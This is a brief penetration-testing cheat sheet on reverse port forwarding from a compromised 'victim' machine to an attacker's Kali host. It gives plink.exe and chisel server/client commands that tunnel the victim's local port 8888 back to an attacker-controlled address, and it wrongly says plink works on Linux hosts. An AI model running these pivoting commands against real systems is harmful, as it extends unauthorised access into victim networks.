# Plink.exe
Plink allow port forwarding on linux hosts.

From victim machine, we can listen on the attacker's port and forward it to a local port.

``` plink.exe -l <username> -pw <password> <ip> -R 8888:127.0.0.1:8888 ```

# Chisel
To obtain the same results as above:

(Run on attacker)

``` chisel.exe server -p 9000 --reverse ```

(Run on victim)

``` chisel.exe client <attacker ip>:9000 R:8888:127.0.0.1:8888 ```

This way, any traffic sent from my kali on port 8888 will be sent to victim's local loopback IP on port 8888.
